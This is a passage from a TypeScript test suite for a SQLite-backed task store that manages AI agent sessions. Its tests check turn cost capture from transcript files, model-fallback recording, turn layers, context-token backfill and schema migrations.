				.filter((e) => e.kind === "stage" || e.kind === "state")
				.map((e) => [e.kind, e.from, e.to]),
		).toEqual([
			["state", null, "queued"],
			["stage", "todo", "in_progress"],
			["state", "queued", "running"],
			["state", "running", "needs_you"],
			["state", "needs_you", "queued"],
		]);
		// Non-transition patch (reorder writes queuedAt) and same-value state: no new events.
		const before = await store.events();
		await store.updateTask(task.id, { queuedAt: Date.now() });
		await store.updateTask(task.id, { state: "queued" });
		expect(await store.events()).toEqual(before);
		await store.close();
	});

	test("finishTurn records an error event except for deliberate cancels", async () => {
		const store = await open(join(root, "stats-errors"));
		const task = await store.createTask("fail me");
		await store.finishTurn(
			(await store.startTurn(task.id, "work", "fail me", null)).id,
			{
				endedAt: Date.now(),
				error: "boom",
			},
		);
		await store.finishTurn(
			(await store.startTurn(task.id, "work", "fail me", null)).id,
			{
				endedAt: Date.now(),
				error: "cancelled",
			},
		);
		const errors = (await store.events()).filter((e) => e.kind === "error");
		expect(errors.map((e) => [e.taskId, e.detail])).toEqual([
			[task.id, "boom"],
		]);
		await store.close();
	});
});

describe("turn cost capture", () => {
	const sid = "cccc0000-0000-0000-0000-000000000201";

	/** One assistant usage record at `at` (the omp transcript message shape). */
	function usageLine(
		at: number,
		usage: { input: number; output: number; cost: number },
	): string {
		return JSON.stringify({
			type: "message",
			timestamp: new Date(at).toISOString(),
			message: {
				role: "assistant",
				model: "m",
				usage: {
					input: usage.input,
					output: usage.output,
					cacheRead: 0,
					cacheWrite: 0,
					cost: { total: usage.cost },
				},
			},
		});
	}

	function writeTranscript(
		sessionsDir: string,
		sessionId: string,
		lines: string[],
	): void {
		mkdirSync(sessionsDir, { recursive: true });
		writeFileSync(
			join(sessionsDir, `2026-09-27T10-00-00-000Z_${sessionId}.jsonl`),
			`${lines.join("\n")}\n`,
		);
	}

	test("finishTurn fills cost from the transcript window", async () => {
		const dir = join(root, "cost-finish");
		const store = await open(dir);
		const t = await store.updateTask((await store.createTask("costly")).id, {
			sessionId: sid,
		});
		const a = await store.startTurn(t.id, "work", "a", null);
		// One record inside [started_at, ended_at], one after the turn ended.
		writeTranscript(store.sessionsDir, sid, [
			usageLine(a.startedAt + 1000, { input: 10, output: 1, cost: 0.25 }),
			usageLine(a.startedAt + 5000, { input: 99, output: 9, cost: 9 }),
		]);
		await store.finishTurn(a.id, { endedAt: a.startedAt + 2000 });
		await store.close();

		const raw = new Database(join(dir, ".tasks", "tasks.db"));
		const rows = raw
			.query<
				{
					tokens_in: number;
					tokens_out: number;
					cache_read: number;
					cache_write: number;
					cost: number;
				},
				[]
			>(
				"SELECT tokens_in, tokens_out, cache_read, cache_write, cost FROM turns",
			)
			.all();
		raw.close();
		expect(rows).toEqual([
			{
				tokens_in: 10,
				tokens_out: 1,
				cache_read: 0,
				cache_write: 0,
				cost: 0.25,
			},
		]);
	});

	test("two turns of one session split the transcript by their timestamp windows", async () => {
		const dir = join(root, "cost-split");
		const store = await open(dir);
		const sessionsDir = store.sessionsDir;
		const t = await store.updateTask((await store.createTask("costly")).id, {
			sessionId: sid,
		});
		const a = await store.startTurn(t.id, "work", "a", null);
		const b = await store.startTurn(t.id, "work", "b", null);
		await store.finishTurn(a.id, { endedAt: a.startedAt + 1000 });
		await store.finishTurn(b.id, { endedAt: b.startedAt + 1000 });
		await store.close();
		// Pin the two windows apart (raw write: the store is closed) and lay the
		// transcript over them; the backfill owns each message by its record timestamp.
		const T = Date.parse("2026-09-27T10:00:00.000Z");
		const raw = new Database(join(dir, ".tasks", "tasks.db"));
		raw.run("UPDATE turns SET started_at = ?, ended_at = ? WHERE id = ?", [
			T,
			T + 600_000,
			a.id,
		]);
		raw.run("UPDATE turns SET started_at = ?, ended_at = ? WHERE id = ?", [
			T + 700_000,
			T + 1_300_000,
			b.id,
		]);
		raw.close();
		writeTranscript(sessionsDir, sid, [
			usageLine(T + 60_000, { input: 10, output: 1, cost: 0.25 }), // A only
			usageLine(T + 760_000, { input: 20, output: 2, cost: 0.5 }), // B only
			usageLine(T + 1_400_000, { input: 99, output: 9, cost: 9 }), // after both
		]);
		// The backfill runs on open and splits the transcript by window.
		const reopened = await open(dir);
		expect(
			(await reopened.perfFacts()).turns.sort((x, y) => x.endedAt - y.endedAt),
		).toEqual([
			{ endedAt: T + 600_000, failed: false, cost: 0.25 },
			{ endedAt: T + 1_300_000, failed: false, cost: 0.5 },
		]);
		await reopened.close();
		// Backfill persisted the per-window costs.
		const raw2 = new Database(join(dir, ".tasks", "tasks.db"));
		const costs = raw2
			.query<{ cost: number }, []>("SELECT cost FROM turns ORDER BY id")
			.all();
		raw2.close();
		expect(costs).toEqual([{ cost: 0.25 }, { cost: 0.5 }]);
	});

	test("a session without a transcript keeps cost NULL and never fails the turn", async () => {
		const dir = join(root, "cost-missing");
		const store = await open(dir);
		const t = await store.updateTask((await store.createTask("no file")).id, {
			sessionId: sid,
		});
		const turn = await store.startTurn(t.id, "work", "p", null);
		const ended = await store.finishTurn(turn.id, {
			endedAt: turn.startedAt + 1000,
		});
		expect(ended.endedAt).toBe(turn.startedAt + 1000);
		const orphan = await store.startTurn(
			(await store.createTask("no session")).id,
			"work",
			"p",
			null,
		);
		await store.finishTurn(orphan.id, { endedAt: orphan.startedAt + 1000 });
		expect((await store.perfFacts()).turns.every((x) => x.cost === null)).toBe(
			true,
		);
		await store.close();
	});

	test("an owned window without usage writes zeros, not NULL", async () => {
		const dir = join(root, "cost-zeros");
		const store = await open(dir);
		const t = await store.updateTask((await store.createTask("quiet")).id, {
			sessionId: sid,
		});
		const turn = await store.startTurn(t.id, "work", "p", null);
		// The session ran in the window (a user record) but billed nothing there.
		writeTranscript(store.sessionsDir, sid, [
			JSON.stringify({
				type: "message",
				timestamp: new Date(turn.startedAt + 10).toISOString(),
				message: { role: "user", content: "go" },
			}),
		]);
		await store.finishTurn(turn.id, { endedAt: turn.startedAt + 1000 });
		await store.close();
		const raw = new Database(join(dir, ".tasks", "tasks.db"));
		const row = raw
			.query<{ tokens_in: number; cost: number }, []>(
				"SELECT tokens_in, cost FROM turns",
			)
			.get();
		raw.close();
		expect(row).toEqual({ tokens_in: 0, cost: 0 });
	});

	test("a turn of a replaced session keeps cost NULL in the backfill", async () => {
		const dir = join(root, "cost-replaced");
		const oldSid = "dddd0000-0000-0000-0000-000000000301";
		const newSid = "dddd0000-0000-0000-0000-000000000302";
		const store = await open(dir);
		const t = await store.updateTask((await store.createTask("restarted")).id, {
			sessionId: oldSid,
		});
		const old = await store.startTurn(t.id, "work", "p", null);
		await store.finishTurn(old.id, { endedAt: old.startedAt + 1000 }); // no file yet: NULL
		// The old session's own transcript bills cost 2 inside the old turn's window...
		writeTranscript(store.sessionsDir, oldSid, [
			usageLine(old.startedAt + 100, { input: 1, output: 1, cost: 2 }),
		]);
		// ...but the task moved to a new session that started after the old turn ended.
		await store.updateTask(t.id, { sessionId: newSid });
		const T = old.startedAt + 60_000;
		writeTranscript(store.sessionsDir, newSid, [
			usageLine(T, { input: 5, output: 5, cost: 0.5 }),
		]);
		await store.close();
		const reopened = await open(dir);
		// Not a confirmed zero: the current transcript cannot speak for that turn.
		expect((await reopened.perfFacts()).turns[0]?.cost).toBeNull();
		await reopened.close();
	});

	test("a malformed transcript keeps cost NULL at turn end, and a repaired one fills on reopen", async () => {
		const dir = join(root, "cost-malformed-finish");
		const store = await open(dir);
		const t = await store.updateTask((await store.createTask("garbled")).id, {
			sessionId: sid,
		});
		const turn = await store.startTurn(t.id, "work", "p", null);
		const good = usageLine(turn.startedAt + 100, {
			input: 3,
			output: 1,
			cost: 0.4,
		});
		writeTranscript(store.sessionsDir, sid, [good, "{broken"]);
		await store.finishTurn(turn.id, { endedAt: turn.startedAt + 1000 });
		expect((await store.perfFacts()).turns[0]?.cost).toBeNull();
		writeTranscript(store.sessionsDir, sid, [good]);
		await store.close();
		const reopened = await open(dir);
		expect((await reopened.perfFacts()).turns[0]?.cost).toBe(0.4);
		await reopened.close();
	});

	test("a malformed transcript keeps cost NULL in the backfill until repaired", async () => {
		const dir = join(root, "cost-malformed-backfill");
		const sid3 = "eeee0000-0000-0000-0000-000000000401";
		const store = await open(dir);
		const t = await store.updateTask(
			(await store.createTask("garbled later")).id,
			{
				sessionId: sid3,
			},
		);
		const turn = await store.startTurn(t.id, "work", "p", null);
		await store.finishTurn(turn.id, { endedAt: turn.startedAt + 1000 }); // no file: NULL
		const good = usageLine(turn.startedAt + 100, {
			input: 3,
			output: 1,
			cost: 0.6,
		});
		writeTranscript(store.sessionsDir, sid3, [good, "not json"]);
		await store.close();
		const first = await open(dir);
		expect((await first.perfFacts()).turns[0]?.cost).toBeNull();
		writeTranscript(first.sessionsDir, sid3, [good]);
		await first.close();
		const second = await open(dir);
		expect((await second.perfFacts()).turns[0]?.cost).toBe(0.6);
		await second.close();
	});

	// The subagent folder sits beside the session file (`<ts>_<sid>/`). Breakages are built
	// without chmod, so they hold under root too: a directory where a .jsonl file belongs
	// (EISDIR on read) and a plain file where the folder belongs (ENOTDIR on list).
	const subBreaks: [string, (subDir: string) => void][] = [
		[
			"an unreadable subagent file",
			(subDir) =>
				mkdirSync(join(subDir, "0-broken.jsonl"), { recursive: true }),
		],
		[
			"a subagent folder path that is not a folder",
			(subDir) => writeFileSync(subDir, "not a folder"),
		],
	];
	for (const [label, breakIt] of subBreaks) {
		test(`${label} keeps cost NULL at turn end and in the backfill until repaired`, async () => {
			const dir = join(root, `cost-sub-${label.length}`);
			const sid4 = `ffff0000-0000-0000-0000-00000000050${label.length % 10}`;
			const store = await open(dir);
			const t = await store.updateTask(
				(await store.createTask("subagents")).id,
				{
					sessionId: sid4,
				},
			);
			const turn = await store.startTurn(t.id, "work", "p", null);
			const at = turn.startedAt + 100;
			writeTranscript(store.sessionsDir, sid4, [
				usageLine(at, { input: 1, output: 1, cost: 1 }),
			]);
			const subDir = join(
				store.sessionsDir,
				`2026-09-27T10-00-00-000Z_${sid4}`,
			);
			breakIt(subDir);
			await store.finishTurn(turn.id, { endedAt: turn.startedAt + 1000 });
			expect((await store.perfFacts()).turns[0]?.cost).toBeNull(); // turn end
			await store.close();
			const first = await open(dir);
			expect((await first.perfFacts()).turns[0]?.cost).toBeNull(); // backfill
			await first.close();
			// Repair: a readable folder with one subagent file that bills 2 more.
			rmSync(subDir, { recursive: true, force: true });
			mkdirSync(subDir, { recursive: true });
			writeFileSync(
				join(subDir, "0-sub.jsonl"),
				usageLine(at + 10, { input: 1, output: 1, cost: 2 }),
			);
			const second = await open(dir);
			expect((await second.perfFacts()).turns[0]?.cost).toBe(3);
			await second.close();
		});
	}

	test("reopen backfills an old turn's cost once its transcript exists", async () => {
		const dir = join(root, "cost-backfill");
		const sid2 = "cccc0000-0000-0000-0000-000000000202";
		const store = await open(dir);
		const t = await store.updateTask((await store.createTask("old work")).id, {
			sessionId: sid2,
		});
		const turn = await store.startTurn(t.id, "work", "p", null);
		await store.finishTurn(turn.id, { endedAt: turn.startedAt + 1000 });
		expect((await store.perfFacts()).turns[0]?.cost).toBeNull(); // no transcript yet
		writeTranscript(store.sessionsDir, sid2, [
			usageLine(turn.startedAt + 100, { input: 7, output: 3, cost: 0.75 }),
		]);
		await store.close();
		// The backfill runs on open, before any caller touches the store.
		const reopened = await open(dir);
		expect((await reopened.perfFacts()).turns).toEqual([
			{ endedAt: turn.startedAt + 1000, failed: false, cost: 0.75 },
		]);
		await reopened.close();
		// A second open is idempotent: filled turns are not re-read.
		expect((await (await open(dir)).perfFacts()).turns).toEqual([
			{ endedAt: turn.startedAt + 1000, failed: false, cost: 0.75 },
		]);
	});

	test("open adds the cost columns to a database created before them", async () => {
		const dir = join(root, "cost-migration");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const legacy = new Database(join(dir, ".tasks", "tasks.db"), {
			create: true,
		});
		// The turns schema as it was before cost capture existed.
		legacy.exec(
			"CREATE TABLE turns (id INTEGER PRIMARY KEY AUTOINCREMENT, task_id TEXT NOT NULL, kind TEXT NOT NULL, prompt TEXT NOT NULL, started_at INTEGER NOT NULL, ended_at INTEGER, pid INTEGER, exit_code INTEGER, outcome TEXT, summary TEXT, details TEXT, question TEXT, error TEXT)",
		);
		legacy.close();
		const store = await open(dir);
		const t = await store.createTask("legacy cost");
		const turn = await store.startTurn(t.id, "work", "p", null);
		// The capture path runs against the freshly added columns without throwing.
		await store.finishTurn(turn.id, { endedAt: turn.startedAt + 1000 });
		expect((await store.perfFacts()).turns).toHaveLength(1);
		await store.close();
		const raw = new Database(join(dir, ".tasks", "tasks.db"));
		const cols = raw
			.query<{ name: string }, []>("PRAGMA table_info(turns)")
			.all()
			.map((c) => c.name);
		raw.close();
		for (const col of [
			"tokens_in",
			"tokens_out",
			"cache_read",
			"cache_write",
			"cost",
		])
			expect(cols).toContain(col);
	});
});

describe("turn dispatched model (provider fallback)", () => {
	test("a settled swap keeps the served model and the dispatched selector", async () => {
		const store = await open(join(root, "turn-swap-settled"));
		const task = await store.createTask("fallback pick");
		// startTurn snapshots the dispatch: the --model this run starts with.
		const turn = await store.startTurn(
			task.id,
			"work",
			"p",
			null,
			null,
			"anthropic/claude-opus-5-5:medium",
		);
		expect(turn.model).toBe("anthropic/claude-opus-5-5:medium");
		expect(turn.dispatchedModel).toBeNull();
		await store.finishTurn(turn.id, {
			endedAt: turn.startedAt + 1000,
			// The stream served another model: omp's retry chain fell back.
			model: "zai/glm-5.3",
			dispatchedModel: "anthropic/claude-opus-5-5:medium",
		});
		const [settled] = await store.listTurns(task.id);
		expect(settled?.model).toBe("zai/glm-5.3");
		expect(settled?.dispatchedModel).toBe("anthropic/claude-opus-5-5:medium");
		await store.close();
	});

	test("a settle without a swap leaves the dispatched selector null", async () => {
		const store = await open(join(root, "turn-swap-clean"));
		const task = await store.createTask("steady pick");
		const turn = await store.startTurn(
			task.id,
			"work",
			"p",
			null,
			null,
			"zai/glm-5.3-flash:max",
		);
		await store.finishTurn(turn.id, {
			endedAt: turn.startedAt + 1000,
			model: "zai/glm-5.3-flash",
		});
		const [settled] = await store.listTurns(task.id);
		expect(settled?.model).toBe("zai/glm-5.3-flash");
		expect(settled?.dispatchedModel).toBeNull();
		await store.close();
	});

	test("open adds dispatched_model to a database created before it", async () => {
		const dir = join(root, "swap-migration");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const legacy = new Database(join(dir, ".tasks", "tasks.db"), {
			create: true,
		});
		// The turns schema as it was before the fallback note existed.
		legacy.exec(
			"CREATE TABLE turns (id INTEGER PRIMARY KEY AUTOINCREMENT, task_id TEXT NOT NULL, kind TEXT NOT NULL, prompt TEXT NOT NULL, started_at INTEGER NOT NULL, ended_at INTEGER, pid INTEGER, exit_code INTEGER, outcome TEXT, summary TEXT, details TEXT, question TEXT, error TEXT, model TEXT)",
		);
		legacy.close();
		const store = await open(dir);
		const task = await store.createTask("legacy swap");
		const turn = await store.startTurn(task.id, "work", "p", null);
		// The swap path runs against the freshly added column without throwing.
		await store.finishTurn(turn.id, {
			endedAt: turn.startedAt + 1000,
			dispatchedModel: "anthropic/claude-opus-5-5:medium",
		});
		expect((await store.listTurns(task.id))[0]?.dispatchedModel).toBe(
			"anthropic/claude-opus-5-5:medium",
		);
		await store.close();
		const raw = new Database(join(dir, ".tasks", "tasks.db"));
		const cols = raw
			.query<{ name: string }, []>("PRAGMA table_info(turns)")
			.all()
			.map((c) => c.name);
		raw.close();
		expect(cols).toContain("dispatched_model");
	});
});

describe("turn layer", () => {
	test("startTurn persists and returns the layer; the default stays null", async () => {
		const store = await open(join(root, "turn-layer-basic"));
		const task = await store.createTask("layered things");
		const flat = await store.startTurn(task.id, "work", "p", null);
		expect(flat.layer).toBeNull();
		const pinned = await store.startTurn(
			task.id,
			"work",
			"p",
			null,
			null,
			null,
			null,
			"abc123",
		);
		expect(pinned.layer).toBe("abc123");
		// The read-back row carries it: a fresh list sees the stored layer too.
		expect((await store.listTurns(task.id)).map((t) => t.layer)).toEqual([
			null,
			"abc123",
		]);
		await store.close();
	});

	test("listOpenTurnLayers returns distinct layers of open turns only", async () => {
		const store = await open(join(root, "turn-layer-open"));
		const task = await store.createTask("open layers");
		const a = await store.startTurn(
			task.id,
			"work",
			"p",
			null,
			null,
			null,
			null,
			"a",
		);
		const a2 = await store.startTurn(
			task.id,
			"work",
			"p",
			null,
			null,
			null,
			null,
			"a",
		); // dup layer
		const b = await store.startTurn(
			task.id,
			"work",
			"p",
			null,
			null,
			null,
			null,
			"b",
		);
		await store.startTurn(task.id, "work", "p", null); // flat, never listed
		await store.finishTurn(a.id, { endedAt: Date.now() }); // one "a" turn finished...
		expect(await store.listOpenTurnLayers()).toEqual(["a", "b"]); // ...its dup still holds "a"
		await store.finishTurn(a2.id, { endedAt: Date.now() });
		expect(await store.listOpenTurnLayers()).toEqual(["b"]);
		await store.finishTurn(b.id, { endedAt: Date.now() });
		expect(await store.listOpenTurnLayers()).toEqual([]);
		await store.close();
	});

	test("open adds the layer column to a database created before it", async () => {
		const dir = join(root, "layer-migration");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const legacy = new Database(join(dir, ".tasks", "tasks.db"), {
			create: true,
		});
		// The turns schema as it was before the layer column existed.
		legacy.exec(
			"CREATE TABLE turns (id INTEGER PRIMARY KEY AUTOINCREMENT, task_id TEXT NOT NULL, kind TEXT NOT NULL, prompt TEXT NOT NULL, started_at INTEGER NOT NULL, ended_at INTEGER, pid INTEGER, exit_code INTEGER, outcome TEXT, summary TEXT, details TEXT, question TEXT, error TEXT, model TEXT, tokens_in INTEGER, tokens_out INTEGER, cache_read INTEGER, cache_write INTEGER, cost REAL)",
		);
		legacy.exec(
			"INSERT INTO turns (task_id, kind, prompt, started_at) VALUES ('leg1', 'work', 'old turn', 1)",
		);
		legacy.close();
		const store = await open(dir);
		const task = await store.createTask("after layer migration");
		const turn = await store.startTurn(
			task.id,
			"work",
			"p",
			null,
			null,
			null,
			null,
			"fresh-layer",
		);
		expect(turn.layer).toBe("fresh-layer");
		// The pre-migration row reads as null (flat-home era), not as an error.
		expect((await store.listTurns(task.id)).map((t) => t.layer)).toEqual([
			"fresh-layer",
		]);
		await store.close();
		const raw = new Database(join(dir, ".tasks", "tasks.db"));
		expect(
			raw
				.query<{ layer: string | null }, []>(
					"SELECT layer FROM turns WHERE task_id = 'leg1'",
				)
				.get()?.layer,
		).toBeNull();
		raw.close();
	});
});

describe("done task context capture", () => {
	const sid = "eeee0000-0000-0000-0000-000000000401";

	/** One assistant contextSnapshot record at `at` (the omp transcript message shape). */
	function contextLine(at: number, promptTokens: number): string {
		return JSON.stringify({
			type: "message",
			timestamp: new Date(at).toISOString(),
			message: {
				role: "assistant",
				provider: "zai",
				model: "glm-5.3-flash",
				usage: {},
				contextSnapshot: { promptTokens, compactionEpoch: 0 },
			},
		});
	}

	function writeTranscript(
		sessionsDir: string,
		sessionId: string,
		lines: string[],
	): void {
		mkdirSync(sessionsDir, { recursive: true });
		writeFileSync(
			join(sessionsDir, `2026-09-27T10-00-00-000Z_${sessionId}.jsonl`),
			`${lines.join("\n")}\n`,
		);
	}

	function storedContext(dir: string): number | null {
		const raw = new Database(join(dir, ".tasks", "tasks.db"));
		const row = raw
			.query<{ context_tokens: number | null }, []>(
				"SELECT context_tokens FROM tasks",
			)
			.get();
		raw.close();
		return row?.context_tokens ?? null;
	}

	test("finishTurn stores the session's final context tokens", async () => {
		const dir = join(root, "context-finish");
		const store = await open(dir);
		const t = await store.updateTask(
			(await store.createTask("contextful")).id,
			{
				sessionId: sid,
			},
		);
		const turn = await store.startTurn(t.id, "work", "p", null);
		// The last snapshot wins: an earlier smaller reading, then the final one.
		writeTranscript(store.sessionsDir, sid, [
			contextLine(turn.startedAt + 100, 10_000),
			contextLine(turn.startedAt + 2000, 250_000),
		]);
		await store.finishTurn(turn.id, { endedAt: turn.startedAt + 3000 });
		expect((await store.perfFacts()).tasks[0]?.contextTokens).toBe(250_000);
		await store.close();
		expect(storedContext(dir)).toBe(250_000);
	});

	test("a turn without a transcript keeps the column NULL, a later turn refreshes it", async () => {
		const dir = join(root, "context-refresh");
		const store = await open(dir);
		const t = await store.updateTask((await store.createTask("late file")).id, {
			sessionId: sid,
		});
		const a = await store.startTurn(t.id, "work", "p", null);
		await store.finishTurn(a.id, { endedAt: a.startedAt + 1000 });
		expect((await store.perfFacts()).tasks[0]?.contextTokens).toBeNull();
		writeTranscript(store.sessionsDir, sid, [
			contextLine(a.startedAt + 2000, 300_000),
		]);
		const b = await store.startTurn(t.id, "work", "p2", null);
		await store.finishTurn(b.id, { endedAt: b.startedAt + 1000 });
		expect((await store.perfFacts()).tasks[0]?.contextTokens).toBe(300_000);
		await store.close();
	});

	test("reopen backfills a done task's reading once its transcript exists", async () => {
		const dir = join(root, "context-backfill");
		const store = await open(dir);
		const t = await store.updateTask(
			(await store.createTask("done later")).id,
			{
				sessionId: sid,
			},
		);
		const turn = await store.startTurn(t.id, "work", "p", null);
		await store.finishTurn(turn.id, { endedAt: turn.startedAt + 1000 }); // no file yet
		await store.updateTask(t.id, { stage: "done" });
		await store.close();
		expect(storedContext(dir)).toBeNull();
		writeTranscript(store.sessionsDir, sid, [
			contextLine(turn.startedAt + 900, 128_000),
		]);
		const reopened = await open(dir);
		expect((await reopened.perfFacts()).tasks[0]?.contextTokens).toBe(128_000);
		await reopened.close();
		// A second open is idempotent: filled tasks are not re-read.
		expect((await (await open(dir)).perfFacts()).tasks[0]?.contextTokens).toBe(
			128_000,
		);
	});

	test("only done tasks backfill; a missing transcript keeps NULL", async () => {
		const dir = join(root, "context-skip");
		const missingSid = "eeee0000-0000-0000-0000-000000000402";
		const store = await open(dir);
		// The running card's transcript exists on disk, the done card's does not.
		await store.updateTask((await store.createTask("still open")).id, {
			sessionId: sid,
		});
		const done = await store.updateTask(
			(await store.createTask("no transcript")).id,
			{
				sessionId: missingSid,
			},
		);
		await store.updateTask(done.id, { stage: "done" });
		await store.close();
		writeTranscript(store.sessionsDir, sid, [contextLine(1, 64_000)]);
		const facts = (await (await open(dir)).perfFacts()).tasks;
		// The running card never backfills, even with a readable transcript.
		expect(facts.find((f) => f.doneAt === null)?.contextTokens).toBeNull();
		// The done card has no transcript to read.
		expect(facts.find((f) => f.doneAt !== null)?.contextTokens).toBeNull();
	});
});

describe("row literals and patch types", () => {
	// Regression for R4-9: createTask/startTurn used to hand-build their return values,
	// which could drift from the stored row and the toTask/toTurn normalizers.
	test("createTask and startTurn return the stored rows, not hand-built literals", async () => {
		const dir = join(root, "read-back");
		mkdirSync(dir, { recursive: true });
		// Create the real schema first (ProjectStore.init makes dir and tables), then add
		// the trigger to that live schema so it exists before any row is inserted.
		await (await open(dir)).close();
		// A trigger rewrites the stored title behind the store's back; a literal return misses it.
		const raw = new Database(join(dir, ".tasks", "tasks.db"));
		raw.exec(
			"CREATE TRIGGER stamp AFTER INSERT ON tasks BEGIN UPDATE tasks SET title = title || '!' WHERE rowid = new.rowid; END",
		);
		raw.close();
		const store = await open(dir);
		const task = await store.createTask("read me back", "glm");
		expect(task.title).toBe("read me back!");
		expect(await store.getTask(task.id)).toEqual(task);
		const turn = await store.startTurn(
			task.id,
			"work",
			"read me back",
			4242,
			"in",
		);
		const storedTurn = (await store.listTurns(task.id))[0];
		expect(storedTurn).toBeDefined();
		expect(storedTurn).toEqual(turn);
		await store.close();
	});

	// Regression for R4-8: doneAt used to be accepted by updateTask and silently dropped
	// (TASK_COLUMNS has no mapping). The patch type now rejects it at compile time.
	test("updateTask ignores fields only the store may write", async () => {
		const store = await open(join(root, "patch-type"));
		const t = await store.createTask("typed");
		// @ts-expect-error TaskPatch excludes doneAt: done_at is stamped internally on entering Done
		await store.updateTask(t.id, { doneAt: 123 });
		expect((await store.getTask(t.id))?.doneAt).toBeNull();
		await store.close();
	});
});

describe("preparing migration", () => {
	// A database from before `preparing` existed: full post-backfill column set, old state CHECK.
	const OLD_TASKS_DDL = `CREATE TABLE tasks (
		id TEXT PRIMARY KEY,
		title TEXT,
		prompt TEXT,
		stage TEXT NOT NULL CHECK (stage IN ('todo','in_progress','merging','done')),
		state TEXT NOT NULL CHECK (state IN ('queued','running','needs_you','idle')),
		needs_reason TEXT,
		pending_prompt TEXT,
		branch TEXT,
		base TEXT,
		worktree TEXT,
		session_id TEXT,
		summary TEXT,
		details TEXT,
		created_at INTEGER NOT NULL,
		updated_at INTEGER NOT NULL,
		queued_at INTEGER,
		cancelled_at INTEGER,
		images TEXT NOT NULL DEFAULT '[]',
		pending_images TEXT NOT NULL DEFAULT '[]',
		release_version TEXT,
		release_notes TEXT,
		session_title TEXT,
		asked TEXT,
		model TEXT,
		kept_files TEXT NOT NULL DEFAULT '[]',
		follow_up_of TEXT,
		commits INTEGER,
		done_at INTEGER
	)`;

	const laterTaskFields = {
		pushSha: "check-migration-head",
		promptAuthor: "board" as const,
		findingsCheckedAt: 123,
		gate: { hash: null, seen: null, fails: 2, sig: null, parked: true },
		uncommittedFiles: ["src/retained.ts"],
	};
	const laterSettings = {
		displayName: "Migrated board",
		releaseCommand: "bun run release",
		issueWatch: true,
		issueWatchSince: 101,
	};

	async function writeLaterRebuildFields(store: ProjectStore): Promise<void> {
		const sessionId = "eeee0000-0000-0000-0000-000000000901";
		await store.updateTask("seed1", { ...laterTaskFields, sessionId });
		await store.setSettings(laterSettings);
		const turn = await store.startTurn(
			"seed1",
			"work",
			"CHECK migration context",
			null,
		);
		mkdirSync(store.sessionsDir, { recursive: true });
		writeFileSync(
			join(store.sessionsDir, `2026-09-27T10-00-00-000Z_${sessionId}.jsonl`),
			`${JSON.stringify({
				type: "message",
				timestamp: new Date(turn.startedAt + 100).toISOString(),
				message: {
					role: "assistant",
					provider: "zai",
					model: "test/model",
					usage: {},
					contextSnapshot: { promptTokens: 64000, compactionEpoch: 0 },
				},
			})}\n`,
		);
		await store.finishTurn(turn.id, { endedAt: turn.startedAt + 200 });
	}

	async function expectLaterRebuildFields(store: ProjectStore): Promise<void> {
		expect(await store.getTask("seed1")).toMatchObject(laterTaskFields);
		expect(await store.getSettings()).toMatchObject(laterSettings);
		const facts = await store.perfFacts();
		expect(facts.tasks.find((task) => task.id === "seed1")?.contextTokens).toBe(
			64000,
		);
		const turns = await store.listTurns("seed1");
		expect(turns).toHaveLength(1);
		expect(turns[0]?.prompt).toBe("CHECK migration context");
		expect(turns[0]?.endedAt).toBe(turns[0]!.startedAt + 200);
	}

	async function expectCheckSchemaMatchesFresh(dir: string): Promise<void> {
		const freshDir = `${dir}-fresh-schema`;
		const fresh = await open(freshDir);
		await fresh.close();
		const migratedDb = new Database(join(dir, ".tasks", "tasks.db"));
		const freshDb = new Database(join(freshDir, ".tasks", "tasks.db"));
		try {
			for (const table of ["tasks", "turns", "settings"]) {
				const columns = (db: Database) =>
					db
						.query<{ name: string }, []>(`PRAGMA table_info(${table})`)
						.all()
						.map((column) => column.name)
						.sort();
				expect(columns(migratedDb)).toEqual(columns(freshDb));
			}
		} finally {
			migratedDb.close();
			freshDb.close();
		}
	}

	test("open adds the follow-up PR columns to an old-schema tasks table", async () => {
		const dir = join(root, "followup-pr-migration");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const db = new Database(join(dir, ".tasks", "tasks.db"));
		db.exec(`CREATE TABLE tasks (
			id TEXT PRIMARY KEY,
			title TEXT,
			prompt TEXT,
			stage TEXT NOT NULL,
			state TEXT NOT NULL,
			needs_reason TEXT,
			pending_prompt TEXT,
			branch TEXT,
			base TEXT,
			worktree TEXT,
			session_id TEXT,
			summary TEXT,
			details TEXT,
			created_at INTEGER NOT NULL,
			updated_at INTEGER NOT NULL
		)`);
		db.exec(
			"INSERT INTO tasks (id, stage, state, created_at, updated_at) VALUES ('seed1', 'merging', 'idle', 1, 1)",
		);
		db.exec(
			"INSERT INTO tasks (id, stage, state, created_at, updated_at) VALUES ('seed2', 'merging', 'idle', 2, 2)",
		);
		db.close();

		const store = await open(dir);
		await store.updateTask("seed1", {
			followUpPrNumber: 33,
			followUpPrUrl: "https://github.com/acme/repo/pull/33",
		});
		const after = await store.getTask("seed1");
		expect(after?.followUpPrNumber).toBe(33);
		expect(after?.followUpPrUrl).toBe("https://github.com/acme/repo/pull/33");
		// The columns read null for a row that never held a follow-up PR.
		const plain = await store.getTask("seed2");
		expect(plain?.followUpPrNumber).toBe(null);
		expect(plain?.followUpPrUrl).toBe(null);
		await store.close();

		// The columns are durable across a reopen.
		const reopened = await open(dir);
		expect((await reopened.getTask("seed1"))?.followUpPrNumber).toBe(33);
		await reopened.close();
	});

	test("open rebuilds the old state CHECK without losing rows and accepts preparing", async () => {
		const dir = join(root, "preparing-migration");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const db = new Database(join(dir, ".tasks", "tasks.db"));
		db.exec(OLD_TASKS_DDL);
		db.exec(
			"INSERT INTO tasks (id, title, stage, state, created_at, updated_at) VALUES ('seed1', 'seeded', 'in_progress', 'running', 1, 1)",
		);
		db.close();

		const store = await open(dir);
		expect((await store.getTask("seed1"))?.title).toBe("seeded");
		expect((await store.getTask("seed1"))?.state).toBe("running");
		// The old CHECK rejected exactly this write — the crash from the screenshot.
		await store.updateTask("seed1", { state: "preparing" });
		expect((await store.getTask("seed1"))?.state).toBe("preparing");
		const fresh = await store.createTask("after migration");
		expect((await store.getTask(fresh.id))?.state).toBe("queued");
		await writeLaterRebuildFields(store);
		await expectLaterRebuildFields(store);
		await store.close();
		await expectCheckSchemaMatchesFresh(dir);

		// The constraint change is durable across a reopen.
		const reopened = await open(dir);
		expect((await reopened.getTask("seed1"))?.state).toBe("preparing");
		await expectLaterRebuildFields(reopened);
		await reopened.close();
	});

	test("open rebuilds the old stage CHECK without losing rows and accepts backlog", async () => {
